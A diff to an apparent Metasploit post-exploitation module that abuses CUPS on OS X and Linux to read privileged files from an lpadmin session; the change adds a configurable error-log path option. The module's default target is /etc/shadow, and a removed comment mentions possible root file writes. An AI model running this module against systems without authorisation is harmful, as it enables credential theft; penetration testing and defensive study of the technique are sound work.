@@ -10,7 +10,6 @@ class Metasploit3 < Msf::Post
 	include Msf::Post::Common
 
 	LP_GROUPS = ['lpadmin', '_lpadmin']
-	PREV_ERROR_LOG_PATH = '/var/log/cups/error_log'
 
 	attr_accessor :web_server_was_disabled, :error_log_was_reset
 
@@ -31,8 +30,9 @@ class Metasploit3 < Msf::Post
 
 				...as long as the session is in the lpadmin group.
 
-				Note: This might also work as a root write exploit, if you can ignore the log
-				formatting. The page_log (PageLog= directive) would be useful for ths.
+				Warning: if the user has set up a custom path to the CUPS error log,
+				this module might fail to reset that path correctly. You can specify
+				a custom error log path with the ERROR_LOG datastore option.
 			},
 			'References'     =>
 				[
@@ -50,7 +50,10 @@ class Metasploit3 < Msf::Post
 			'Platform'       => ['osx', 'linux']
 		}))
 		register_options([
-			OptString.new("FILE", [true, "The file to steal.", "/etc/shadow"])
+			OptString.new("FILE", [true, "The file to steal.", "/etc/shadow"]),
+			OptString.new("ERROR_LOG",
+				[true, "The original path to the CUPS error log", '/var/log/cups/error_log']
+			)
 		], self.class)
 	end
 
@@ -127,7 +130,7 @@ class Metasploit3 < Msf::Post
 
 	private
 
-	def prev_error_log_path; PREV_ERROR_LOG_PATH; end
+	def prev_error_log_path; datastore['ERROR_LOG']; end
 	def ctl_path; @ctl_path ||= whereis("cupsctl"); end
 	def strip_http_headers(http); http.gsub(/\A(^.*\r\n)*/, ''); end
 
